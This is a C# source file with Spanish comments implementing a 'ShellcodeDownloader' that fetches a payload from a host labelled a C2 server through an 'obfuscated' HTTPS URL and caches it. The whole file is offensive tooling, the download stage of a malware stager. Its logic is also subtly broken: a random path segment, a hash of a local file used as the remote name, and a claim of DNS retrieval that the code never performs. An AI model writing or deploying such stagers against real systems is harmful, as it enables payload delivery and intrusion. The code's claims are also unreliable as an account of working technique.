using System;
using System.IO;
using System.Net;
using System.Security.Cryptography;
using System.Text;
using System.Collections.Generic;

class ShellcodeDownloader
{
    private static Dictionary<string, byte[]> cache = new Dictionary<string, byte[]>();

    /// <summary>
    /// Descarga la shellcode desde un servidor remoto utilizando consultas DNS y HTTPS.
    /// </summary>
    /// <param name="dnsQuery">Consulta DNS para el servidor remoto.</param>
    /// <param name="fileName">Nombre del archivo de la shellcode.</param>
    /// <returns>Shellcode descargada como un array de bytes.</returns>
    public static byte[] DownloadShellcode(string dnsQuery, string fileName)
    {
        string shellcodeUrl = BuildObfuscatedUrl(dnsQuery, fileName);
        
        // Verificar si la shellcode está en caché
        if (cache.ContainsKey(shellcodeUrl))
        {
            Console.WriteLine("Shellcode encontrada en caché.");
            return cache[shellcodeUrl];
        }

        try
        {
            using (WebClient client = new WebClient())
            {
                byte[] shellcode = client.DownloadData(shellcodeUrl);

                // Agregar la shellcode a la caché
                cache.Add(shellcodeUrl, shellcode);
                Console.WriteLine("Shellcode descargada correctamente y agregada a la caché.");

                return shellcode;
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Error al descargar la shellcode desde '{dnsQuery}': {ex.Message}");
            return null;
        }
    }

    /// <summary>
    /// Construye una URL de descarga de shellcode ofuscada.
    /// </summary>
    /// <param name="dnsQuery">Consulta DNS para el servidor remoto.</param>
    /// <param name="fileName">Nombre del archivo de la shellcode.</param>
    /// <returns>URL de descarga de shellcode.</returns>
    private static string BuildObfuscatedUrl(string dnsQuery, string fileName)
    {
        string randomString = GenerateRandomString(10);
        return $"https://{dnsQuery}/{randomString}/{ComputeHash(fileName)}.bin";
    }

    /// <summary>
    /// Genera una cadena aleatoria de caracteres.
    /// </summary>
    /// <param name="length">Longitud de la cadena.</param>
    /// <returns>Cadena aleatoria generada.</returns>
    private static string GenerateRandomString(int length)
    {
        const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
        StringBuilder sb = new StringBuilder();
        Random random = new Random();
        for (int i = 0; i < length; i++)
        {
            sb.Append(chars[random.Next(chars.Length)]);
        }
        return sb.ToString();
    }

    /// <summary>
    /// Calcula el hash SHA256 de un archivo.
    /// </summary>
    /// <param name="fileName">Nombre del archivo.</param>
    /// <returns>Hash SHA256 del archivo.</returns>
    private static string ComputeHash(string fileName)
    {
        using (SHA256 sha256 = SHA256.Create())
        {
            using (FileStream stream = File.OpenRead(fileName))
            {
                byte[] hashBytes = sha256.ComputeHash(stream);
                return BitConverter.ToString(hashBytes).Replace("-", "").ToLower();
            }
        }
    }

    static void Main(string[] args)
    {
        string dnsQuery = "example.com"; // Nombre de dominio del servidor C2
        string fileName = "shellcode"; // Nombre del archivo de shellcode
        
        // Descargar la shellcode desde el servidor remoto
        byte[] shellcode = DownloadShellcode(dnsQuery, fileName);

        if (shellcode != null)
        {
            Console.WriteLine("Shellcode descargada correctamente.");
        }
        else
        {
            Console.WriteLine("La shellcode no se pudo descargar correctamente.");
        }
    }
}
